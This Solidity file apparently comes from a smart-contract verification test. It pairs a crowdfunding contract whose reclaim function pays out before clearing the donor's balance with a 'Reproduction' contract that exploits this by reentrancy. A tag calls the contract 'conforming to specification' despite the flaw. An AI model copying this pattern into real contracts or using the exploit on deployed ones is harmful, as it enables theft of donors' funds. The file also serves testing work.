// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.5.0;


interface ICrowdfund {
    function invstore() external;
    function donate() external payable;
    function withdraw() external;
    function reclaim() external;
}

/// @custom:version conforming to specification.
contract Crowdfund {
    uint immutable goal;          // amount of ETH that must be donated for the crowdfunding to be succesful
    address immutable owner;      // receiver of the donated funds
    mapping(address => uint) public donors;

    constructor (address payable owner_, uint256 goal_) {
        owner = owner_;
	    goal = goal_;	
    }
    uint saved;

    function invstore() public {
        saved = address(this).balance;
    }

    function donate() public payable {
        donors[msg.sender] += msg.value;
        invstore();
    }

    function withdraw() public {
        require (address(this).balance >= goal);

        (bool succ,) = owner.call{value: address(this).balance}("");
        invstore();
        require(succ);
    }

    function invariant() public {

        assert(address(this).balance == saved);
    }

    function reclaim() public { 
        require (address(this).balance < goal);
        require (donors[msg.sender] > 0);

        uint amount = donors[msg.sender];

        (bool succ,) = msg.sender.call{value: amount}("");
        saved = saved - amount; 
        donors[msg.sender] = 0;
        invariant();
    }
}


contract Reproduction {
    Crowdfund public target;
    address public attacker;
    bool public reentered;

    constructor(address _target) {
        target = Crowdfund(_target);
        attacker = msg.sender;
    }

    function setup() external payable {
        target.donate{value: msg.value}();
    }

    function startExploit() external {
        target.invstore(); 
        target.reclaim();
    }

    receive() external payable {
        reentered = true;
        target.reclaim(); 
    }
}